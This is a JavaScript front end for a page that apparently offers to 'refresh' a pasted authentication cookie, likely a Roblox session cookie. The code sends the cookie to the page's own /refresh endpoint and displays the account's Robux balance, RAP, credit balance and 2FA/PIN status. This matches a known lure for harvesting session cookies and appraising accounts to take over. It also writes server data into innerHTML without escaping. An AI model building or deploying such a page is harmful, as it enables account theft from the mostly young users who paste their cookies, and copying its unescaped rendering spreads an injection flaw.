document.addEventListener("DOMContentLoaded", function () {
    const authCookieInput = document.getElementById("authCookie");
    const refreshButton = document.getElementById("refreshButton");
    const refreshButtonIcon = document.getElementById("refreshButtonIcon");
    const resultElement = document.getElementById("result");
    const countdownElement = document.getElementById("countdown");
    const copyButton = document.getElementById("copyButton");
    
    // Create user info container
    const userInfoContainer = document.createElement("div");
    userInfoContainer.id = "userInfo";
    userInfoContainer.style.marginTop = "20px";
    userInfoContainer.style.padding = "15px";
    userInfoContainer.style.backgroundColor = "#f0f0f0";
    userInfoContainer.style.borderRadius = "5px";
    userInfoContainer.style.display = "none";
    
    // Insert after result container
    resultElement.parentNode.insertBefore(userInfoContainer, resultElement.nextSibling);
    
    // Create status element
    const statusElement = document.createElement("div");
    statusElement.id = "status";
    statusElement.style.marginTop = "10px";
    statusElement.style.fontSize = "14px";
    resultElement.parentNode.insertBefore(statusElement, resultElement.nextSibling);

    refreshButton.addEventListener("click", function () {
        const authCookie = authCookieInput.value.trim();
        
        if (!authCookie) {
            resultElement.textContent = "Please enter a cookie first!";
            statusElement.textContent = "";
            userInfoContainer.style.display = "none";
            return;
        }

        refreshButton.disabled = true;
        refreshButtonIcon.classList.add("rotate-icon");
        resultElement.textContent = "Processing your cookie...";
        statusElement.textContent = "";
        statusElement.style.color = "blue";
        userInfoContainer.style.display = "none";
        userInfoContainer.innerHTML = "";

        let countdown = 5;
        countdownElement.textContent = `Processing in ${countdown} seconds...`;

        const countdownInterval = setInterval(() => {
            countdown--;
            if (countdown > 0) {
                countdownElement.textContent = `Processing in ${countdown} second${countdown !== 1 ? 's' : ''}...`;
            } else if (countdown === 0) {
                countdownElement.textContent = "Processing now...";
            } else {
                clearInterval(countdownInterval);
                countdownElement.textContent = "";
            }
        }, 1000);

        setTimeout(() => {
            fetch("/refresh?cookie=" + encodeURIComponent(authCookie))
                .then((response) => response.json())
                .then((data) => {
                    console.log('Server response:', data);
                    
                    // Always show the cookie
                    resultElement.textContent = data.cookie || authCookie;
                    
                    if (data.success) {
                        statusElement.textContent = "✅ Success!";
                        statusElement.style.color = "green";
                        
                        // Display user information if available
                        if (data.userData) {
                            displayUserInfo(data.userData);
                            userInfoContainer.style.display = "block";
                        }
                        
                        // Auto-copy to clipboard
                        navigator.clipboard.writeText(data.cookie || authCookie).then(() => {
                            copyButton.textContent = "Auto-copied!";
                            setTimeout(() => (copyButton.textContent = "Copy"), 2000);
                        });
                    } else {
                        statusElement.textContent = "⚠️ " + (data.error || "Processing completed");
                        statusElement.style.color = "orange";
                    }
                })
                .catch((error) => {
                    console.error('Error:', error);
                    resultElement.textContent = authCookie;
                    statusElement.textContent = "⚠️ Server error, using original cookie";
                    statusElement.style.color = "red";
                })
                .finally(() => {
                    refreshButton.disabled = false;
                    refreshButtonIcon.classList.remove("rotate-icon");
                });
        }, 5000);
    });

    // Function to display user info
    function displayUserInfo(userData) {
    const infoHTML = `
        <div style="background-color: #000; color: #fff; padding: 20px; border-radius: 10px;">
            <h3 style="margin-top: 0; color: #fff;">User Information</h3>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                <div><strong>Username:</strong> ${userData.Username}</div>
                <div><strong>User ID:</strong> ${userData.UserID}</div>
                <div><strong>Display Name:</strong> ${userData.DisplayName}</div>
                <div><strong>Creation Date:</strong> ${userData.CreationDate}</div>
                <div><strong>Country:</strong> ${userData.Country}</div>
                <div><strong>Robux Balance:</strong> ${userData.AccountBalanceRobux}</div>
                <div><strong>2FA Enabled:</strong> ${userData.Is2FAEnabled ? '✅ Yes' : '❌ No'}</div>
                <div><strong>PIN Enabled:</strong> ${userData.IsPINEnabled ? '✅ Yes' : '❌ No'}</div>
                <div><strong>Premium:</strong> ${userData.IsPremium ? '✅ Yes' : '❌ No'}</div>
                <div><strong>Credit Balance:</strong> ${userData.CreditBalance}</div>
                <div><strong>RAP:</strong> ${userData.RAP}</div>
            </div>
            <div style="margin-top: 15px; font-size: 12px; color: #ccc;">
                <strong>Debug Info:</strong> ${userData.DebugInfo}
            </div>
        </div>
    `;
    userInfoContainer.innerHTML = infoHTML;
}


    // Copy Button
    copyButton.addEventListener("click", function () {
        const textToCopy = resultElement.textContent.trim();
        if (!textToCopy || textToCopy === "Processing your cookie..." || textToCopy.includes("Please")) {
            return;
        }

        navigator.clipboard.writeText(textToCopy).then(() => {
            const originalText = copyButton.textContent;
            copyButton.textContent = "Copied!";
            setTimeout(() => (copyButton.textContent = originalText), 2000);
        }).catch(() => {
            // Fallback
            const textarea = document.createElement("textarea");
            textarea.value = textToCopy;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand("copy");
            document.body.removeChild(textarea);
            
            const originalText = copyButton.textContent;
            copyButton.textContent = "Copied!";
            setTimeout(() => (copyButton.textContent = originalText), 2000);
        });
    });
});